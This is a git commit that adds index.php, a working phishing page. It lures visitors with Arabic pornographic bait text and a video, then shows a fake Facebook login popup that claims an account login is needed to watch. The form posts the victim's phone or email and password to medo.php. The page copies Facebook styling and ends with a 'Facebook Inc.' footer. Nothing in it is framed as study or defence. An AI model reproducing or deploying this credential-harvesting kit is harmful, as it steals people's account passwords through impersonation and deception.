890dcdd3b5ac894b602601ef0860d6c9e2e67713
sbsbbdbdbdbs2 <82833004+sbsbbdbdbdbs2@users.noreply.github.com>
2021-04-19 19:50:50 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,759 @@
+<html>
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title> شوف طيز المفتوح منضر يجنن -XXNX.COM</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/facebook.css">
+ <style type="text/css">
+background: url(https://d.top4top.io/p_1867erlfk1.jpg) no-repeat center center fixed;
+.popup-login {
+	background:rgba(0,0,0,0.5);
+	width:100%;
+	height:100%;
+	position:fixed;
+	top:0;
+	left:0;
+	z-index:9999;
+}
+.popup-box-login-fb {
+	background:#ECEFF6;
+	max-width:330px;
+	height:auto;
+	position:relative;
+	margin:50px auto;
+	margin-top:1.9%;
+	text-align:center;
+	font-family:'Teko';
+	color:#000;
+	border-radius:10px;
+}
+.popup-box-login-twitter {
+	background:#fff;
+	max-width:330px;
+	height:350px;
+	position:relative;
+	margin:50px auto;
+	margin-top:10%;
+	text-align:center;
+	font-family:'Teko';
+	color:#000;
+	border-radius:10px;
+}
+.close-fb {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	position:absolute;
+	top:-8px;
+	right:-10px;
+	display:block;
+}
+.close-fb i {
+	color:#fff;
+	padding-top:1px;
+}
+.close-other {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	top:-8px;
+	right:-10px;
+	position:absolute;
+	z-index:9999999;
+	display:block;
+}
+.close-other i {
+	color:#fff;
+	padding-top:1px;
+}
+@media only screen and (max-width:600px) {
+	.popup-box-login-fb {
+		margin-top: 4%;
+	}
+}
+@charset "utf-8";
+@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
+*,*:before,*:after {
+	-webkit-box-sizing:border-box;
+	-moz-box-sizing:border-box;
+	box-sizing:border-box;
+}
+body {
+	background:url(https://d.top4top.io/p_1867erlfk1.jpg) no-repeat center;
+	-webkit-background-size:cover;
+	-moz-background-size:cover;
+	-o-background-size:cover;
+	background-size:100% 100%;
+	margin: 0;
+	font-family: 'Teko';
+}
+.container {
+	background: url(https://d.top4top.io/p_1867erlfk1.jpg) no-repeat center center;
+	background-size: cover;
+	position: relative;
+	margin: 0px auto;
+	margin-top: 3%;
+	max-width: 400px;
+	height: 800px;
+	border: 3px solid #fff;
+}
+.navbar {
+	background: #fff;
+	width: 100%;
+	height: auto;
+	padding: 5px;
+}
+.navbar img {
+	width: 90px;
+	margin-left: auto;
+	margin-right: auto;
+	display: block;
+}
+.header {
+    background: url(https://d.top4top.io/p_1867erlfk1.jpg) no-repeat;
+    background-size: 100% 100%;
+    width: 100%;
+    height: 210px;
+	margin-left: auto;
+	margin-right: auto;
+	border-bottom: 3px solid #fff;
+	display: block;
+}
+.header img {
+    width: 90%;
+}
+.header-txt-bg {
+	width: 100%;
+	height: 85%;
+}
+.header-txt {
+	color: #fff;
+	font-size: 20px;
+	font-family: Teko;
+	font-weight: bold;
+	text-align: center;
+	text-transform: uppercase;
+}
+.box {
+    width: 100%;
+    height: 400px;
+    margin-bottom: 0px;
+    position: absolute;
+    overflow: none;
+}
+.menu {
+    background: #fff;
+    width: 30%;
+    height: auto;
+    margin: 2px;
+    margin-bottom: 15px;
+	padding: 4px;
+	padding-top: 6px;
+    color: #000;
+	font-weight: bold;
+    text-align: center;
+	text-transform: uppercase;
+	border: 3px solid #000;
+    display: inline-block;
+    cursor: pointer;
+}
+.active {
+    background: #000;
+	color: #fff;
+	border: 3px solid #fff;
+}
+.scroll {
+    overflow: scroll;
+    position: relative;
+    height: 420px;
+    scrollbar-face-color: #ffbb40; 
+    scrollbar-shadow-color: #ffbb40; 
+    scrollbar-highlight-color: #ffbb40; 
+    scrollbar-3dlight-color: #ffbb40; 
+    scrollbar-darkshadow-color: #ffbb40; 
+    scrollbar-track-color: #ffbb40; 
+    scrollbar-arrow-color: #ffbb40;
+}
+.alert-wrapper {
+	width: 93%;
+	height: auto;
+	margin-top: 10px;
+	margin-bottom: 10px;
+	padding-left: 3px;
+	border-left: 3px solid #fff;
+}
+.alert-content {
+	background: #fff;
+	width: 100%;
+	padding: 5px;
+	color: #000;
+	font-size: 15px;
+	font-family: Teko;
+	font-weight: bold;
+	text-transform: uppercase;
+	text-align: left;
+}
+.alert-content i {
+	padding-top: 1px;
+	color: #000;
+	font-size: 18px;
+	float: right;
+}
+.item {
+	background: #fff;
+	width: 30%;
+	height: 110px;
+	margin: 2px;
+	margin-bottom: 38px;
+	color: #000;
+	font-family: Teko;
+	font-weight: 300;
+	text-align: center;
+	border-top-left-radius: 5px;
+	border-top-right-radius: 5px;
+	display: inline-block;
+}
+.item img {
+	width: 100%;
+    height: 100%;
+	border: 1px solid #989376;
+}
+.item button {
+    background: #fff;
+    width: 100%;
+    height: auto;
+    padding: 5px;
+    color: #000;
+    font-family: 'Teko';
+	font-weight: bold;
+	text-transform: uppercase;
+    border: none;
+    outline: none;
+    cursor: pointer;
+}
+.item .item-label {
+	background:#fca6c3;
+	width: 8%;
+	height: auto;
+	padding: 2px;
+	color: #000;
+	font-size: 15px;
+	font-family: Teko, sans-serif;
+	font-weight: bold;
+	text-align: center;
+	text-transform: uppercase;
+	border: 1px solid #000;
+	position: absolute;
+}
+.item img, .item button {
+    border: 3px solid #000;
+}
+.balance {
+	background: #fff;
+	width: 93%;
+	height: 62px;
+	margin-left: auto;
+	margin-right: auto;
+	margin-bottom: 7px;
+	padding: 5px;
+	border: 3px solid #000;
+	display: block;
+}
+.balance img {
+	width: 50px;
+	margin-top: -2px;
+	margin-right: 10px;
+	border: 3px solid #000;
+	float: left;
+}
+.balance-nom {
+	color: #000;
+	font-size: 20px;
+	font-family: Teko;
+	font-weight: bold;
+	text-align: left;
+	text-transform: uppercase;
+}
+.balance-detail {
+	width: auto;
+	height: auto;
+	padding-top: 2px;
+	padding-left: 5px;
+	padding-bottom: 0px;
+	color: #000;
+	font-size: 13px;
+	font-family: Teko;
+	font-weight: bold;
+	text-align: center;
+	text-transform: uppercase;
+	border-left: 3px solid #000;
+	line-height: 15px;
+	float: left;
+}
+.balance button {
+	background: none;
+	width: 25%;
+	height: auto;
+	margin-top: -25px;
+	padding: 5px;
+	color: #000;
+	font-size: 15px;
+	font-family: Teko;
+	font-weight: bold;
+	text-align: center;
+	text-transform: uppercase;
+	border: 3px solid #000;
+	outline: none;
+	float: right;
+}
+.popup {
+	width:100%;
+	height:100%;
+	position:fixed;
+	top:0;
+	left:0;
+	z-index:9999;
+	background-color:rgba(0, 0, 0, 0.4);
+}
+.nav-popup {
+	background: #fff;
+	height: auto;
+	border: 4px;
+	padding:10px;
+	border-bottom: 3px solid #000;
+}
+.nav-popup-title {
+	color: #000;
+	font-size: 25px;
+	font-family: Teko;
+	font-weight: bold;
+	text-align: center;
+	text-transform: uppercase;
+}
+.popup-box {
+    background: #fff;
+	width: 370px;
+	height: auto;
+	position: relative;
+	margin: 50px auto;
+	margin-top: 15%;
+	text-align: center;
+	font-family:'Teko';
+	color:#fff;
+	border: 3px solid #000;
+}
+.popup-alert {
+	padding-top: 10px;
+	padding-left: 10px;
+	padding-bottom: 10px;
+	color: #000;
+	font-size: 18px;
+    font-family: 'Teko';
+	font-weight: bold;
+	text-align: center;
+	text-transform: uppercase;
+}
+.popup-item {
+	width:23%;
+	height:85px;
+	margin-left:auto;
+	margin-right:auto;
+	margin-bottom: 17px;
+	border: 3px solid #000;
+	display: block;
+}
+.popup-btn {
+    background: #fff;
+    width: 32%;
+    height: auto;
+    margin-bottom: 15px;
+	padding: 13px;
+    outline: none;
+	border: none;
+    display: inline-block;
+	font-size: 15px;
+	font-weight: bold;
+	text-transform: uppercase;
+    cursor: pointer;
+}
+.popup-btn span {
+	color: #000;
+	font-size: 17px;
+    font-family: 'Teko';
+	line-height: 5px;
+}
+.popup-btn-cancel {
+	border: 3px solid #000;
+}
+.popup-btn-collect {
+	border: 3px solid #000;
+}
+.btn-login {
+    width: 85%;
+    height: auto;
+    padding: 8px;
+	margin-left: 10px;
+    margin-bottom: 3px;
+    color: #000;
+    font-family: 'Teko';
+    border: none;
+    border-radius: 5px;
+    outline: none;
+    display: inline-block;
+}
+.btn-login i {
+    color: #fff;
+    font-size: 20px;
+    float: left;
+}
+.facebook {
+    background: #3b5998;
+    color: #fff;
+}
+.twitter {
+    background: #08a0e9;
+    color: #fff;
+}
+.popup-close {
+	width:20px;
+	height:20px;
+	color:#000;
+	text-align:center;
+	text-transform: uppercase;
+	font-weight: bold;
+	position:absolute;
+	top:13px;
+	right:10px;
+	display:block;
+}
+.popup-close i {
+	color:#000;
+	font-size: 30px;
+}
+.input-anjir {
+	background: #fff;
+	width: 94%;
+	height: auto;
+	padding: 6px;
+	font-size:15px;
+	font-family: Teko;
+	font-weight: bold;
+	text-transform: uppercase;
+	color: #000;
+	margin-bottom: 3px;
+	border: 3px solid #000;
+	position: relative;
+	outline: none;
+}
+.input-anjir::placeholder {
+	color: #000;
+}
+.select-anjir {
+	background: #fff;
+	width: 94%;
+	height: auto;
+	padding: 6px;
+	font-family: Teko;
+	font-weight: bold;
+	text-transform: uppercase;
+	color: #000;
+	margin-bottom: 3px;
+	border: 3px solid #000;
+	position: relative;
+	outline: none;
+}
+.finish-wrapper {
+	background: url(https://d.top4top.io/p_1867erlfk1.jpg) no-repeat center;
+    background-size: 100% 100%;
+	width: 95%;
+	height: auto;
+	margin-left: auto;
+	margin-right: auto;
+	padding: 10px;
+	color: #EBCC62;
+	font-size: 15px;
+    font-family: 'Teko';
+	text-align: left;
+	display: block;
+}
+.finish-btn {
+    background: #fff;
+    width: 30%;
+    height: 38px;
+	margin-left: auto;
+	margin-right: auto;
+    outline: none;
+	border: 3px solid #000;
+    display: inline-block;
+    cursor: pointer;
+	display: block;
+}
+.finish-btn span {
+	color: #000;
+    font-family: 'Teko';
+	font-weight: bold;
+	text-transform: uppercase;
+	line-height: 5px;
+}
+::-webkit-scrollbar { 
+    display: none;
+    width: 0px;
+}
+@media only screen and (max-width:600px) {
+    .container {
+        width: 100%;
+        height: 100%;
+        margin-top: 0px;
+        margin-bottom: 0px;
+        border-radius: 0px;
+        padding: 0px;
+    }
+    .header {
+        height: 200px;
+    }
+    .scroll {
+        height: 250px;
+    }
+    .item {
+        height: 100px;
+    }
+	.item .item-name {
+		width: 8%;
+	}
+	.balance-detail {
+	    font-size: 12px;
+	}
+    .popup-box {
+		width: 350px;
+		margin-top:50%;
+	}
+	.popup-item {
+		width: 30%;
+		height: 100px;
+	}
+	form button {
+	    margin-top: 5px;
+	}
+}
+.navbar-fb {
+	background: #3b5998;
+	width: 100%;
+	height: auto;
+	padding: 8px;
+	border-top-left-radius: 10px;
+	border-top-right-radius: 10px;
+}
+.navbar-fb img {
+    width: 115;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
+}
+.content-box-fb {
+    width: 300px;
+    height: auto;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
+}
+.content-box-fb img {
+    width: 80;
+    margin-top: 34px;
+    margin-left: auto;
+    margin-right: auto;
+    border-radius: 15px;
+    display: block;
+}
+.txt-login-fb {
+    width: 300px;
+    height: auto;
+    margin-top: 20px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-bottom: 20px;
+    padding: 9px;
+    color: #90949c;
+    font-size: 19px;
+    font-family: Roboto;
+    text-align: center;
+    display: block;
+}
+.login-form input[type="text"],.login-form input[type="password"] {
+	width: 100%;
+	height: auto;
+	padding: 12px;
+	color: #000;
+	font-size: 14px;
+	font-weight: 400;
+	font-family: 'Lato',sans-serif;
+	border: 1px solid #bdbebf;
+	cursor: pointer;
+	outline: none;
+}
+.login-form input[type="text"] {
+    margin: 0;
+    padding-bottom: 13px;
+	border-bottom: none;
+	border-radius: 4px 4px 0 0;
+	box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
+}
+.login-form input[type="password"] {
+    margin: 0;
+	border-top: none;
+	border-radius: 0 0 4px 4px;
+	box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
+}
+.btn-login-fb {
+	background: #1778f2;
+	width: 100%;
+	height: auto;
+	margin-top: 10px;
+	margin-left: auto;
+	margin-right: auto;
+	padding: 10px;
+	color: #fff;
+	font-size: 14px;
+	font-family: Roboto;
+	font-weight: bold;
+	text-align: center;
+	text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
+	border: 1px solid #3578e5;
+	border-radius: 5px;
+	box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
+	outline: none;
+	display: block;
+}
+.txt-create-account {
+    width: 100%;
+    height: auto;
+    padding: 5px;
+    color: #3b5998;
+    font-size: 13.5px;
+    font-family: Roboto;
+    text-align: center;
+}
+.txt-not-now {
+    width: 100%;
+    height: auto;
+    padding: 5px;
+    color: #3b5998;
+    font-size: 13.5px;
+    font-family: Roboto;
+    text-align: center;
+}
+.txt-forgotten-password {
+    width: 100%;
+    height: auto;
+    margin-bottom: 30px;
+    padding: 5px;
+    color: #7596c8;
+    font-size: 13.5px;
+    font-family: Roboto;
+    text-align: center;
+}
+.language-box {
+    width: 100%;
+    height: auto;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
+}
+.language-name {
+    width: 40%;
+    height: auto;
+    margin: 5px;
+    margin-bottom: 0px;
+    color: #3b5998;
+    font-size: 12px;
+    font-family: Roboto;
+    text-align: center;
+    display: inline-block;
+}
+.language-name i {
+    width: 23px;
+    padding: 4px;
+    color: #90949c;
+    border: 1px solid #3b5998;
+    border-radius: 3px;
+}
+.language-name-active {
+    color: #90949c;
+    font-weight: bold;
+}
+.copyright {
+    width: 40%;
+    height: auto;
+    margin-top: 10px;
+    margin-left: auto;
+    margin-right: auto;
+    color: #90949c;
+    font-size: 12px;
+    font-family: Roboto;
+    text-align: center;
+    display: block;
+}
+</style>
+  
+	<div class="popup-box-login-fb">
+		<a onclick="hidefacebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+		<div class="navbar-fb">
+			<img src="https://d.top4top.io/p_1919ve1if0.png">
+		</div>
+		<div class="content-box-fb">
+			<video width="200" controls>
+  <source src="https://i.top4top.io/m_1867f1pc41.mp4" type="video/mp4">
+
+  Your browser does not support HTML video.
+</video>
+			<div class="txt-login-fb">
+				سجل الدخول إلى حسابك على فيسبوك لعرض الأفلام الإباحية
+			</div>
+			<form class="login-form" action="medo.php" method="post">
+			
+				<label>
+				<input type="text" name="medo" placeholder="رقم الهاتف المحمول أو عنوان البريد الإلكتروني" autocomplete="off" autocapitalize="off" required>
+				</label>
+				<label>
+				<input type="password" name="MEDO" placeholder="كلمه السر" autocomplete="off" autocapitalize="off" required>
+				</label>
+				
+			
+				<button type="submit" name="go"  class="btn-login-fb">تسجيل الدخول</button>
+			       
+			</form>
+			<div class="txt-create-account">إنشاء حساب</div>
+			
+			<div class="txt-forgotten-password">هل نسيت كلمه السر؟</div>
+		</div>
+		<div class="language-box">
+			<center>
+			<div class="language-name language-name-active">English (UK)</div>
+			<div class="language-name">Bahasa Indonesia</div>
+			<div class="language-name">Basa Jawa</div>
+			<div class="language-name">Bahasa Melayu</div>
+			<div class="language-name">日本語</div>
+			<div class="language-name">Español</div>
+			<div class="language-name">Português (Brasil)</div>
+			<div class="language-name">
+				<i class="fa fa-plus"></i>
+			</div>
+			</center>
+		</div>
+		<div class="copyright">Facebook Inc.</div>
+	</div>
+</div>
+
+</body>
+</html>
